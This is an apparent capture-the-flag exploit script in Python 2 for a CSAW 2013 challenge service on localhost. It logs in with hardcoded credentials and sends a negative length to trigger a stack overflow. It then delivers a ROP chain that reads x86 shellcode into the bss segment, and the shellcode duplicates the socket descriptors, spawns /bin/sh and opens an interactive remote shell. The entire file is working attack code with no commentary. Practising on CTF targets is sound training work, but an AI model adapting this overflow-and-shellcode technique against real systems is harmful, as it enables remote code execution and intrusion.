import socket
import struct
import time
import telnetlib

def s(s):return sock.send(s)
def p(a):return struct.pack("<I",a)
def u(a):return struct.unpack("<I",a)[0]

def r(s):
	if type(s)==str:
		data=""
		while not data.endswith(s):
			data+=sock.recv(1)
		return data
	else:
		data=sock.recv(s)
		return data

def shell(sock):
	t=telnetlib.Telnet()
	t.sock=sock
	t.interact()
	sock.close()


HOST="localhost"
PORT=34266

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

r("UserName:")
s("csaw2013\n")

r("Password:")
s("S1mplePWD\n")

r("Entry Info:")
s("-1\n")

SHELLCODE = "\x31\xc9\x8d\x41\x3f\x8d\x59\x04\xcd\x80\x8d\x41\x3f\x41\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80\x0a"

read   = p(0x080486e0)
pop3r  = p(0x8049110)
bss    = p(0x0804b000)
fd     = p(0x4)
size   = p(0x1000)
buf    = "A"*0x420

payload = buf + read + pop3r + fd + bss + size + bss + "\n"

print "[+] Send payload"
s(payload)
time.sleep(1)
print "[+] Send SHELLCODE"
s(SHELLCODE)

print "[*] Shell Ready"
shell(sock)
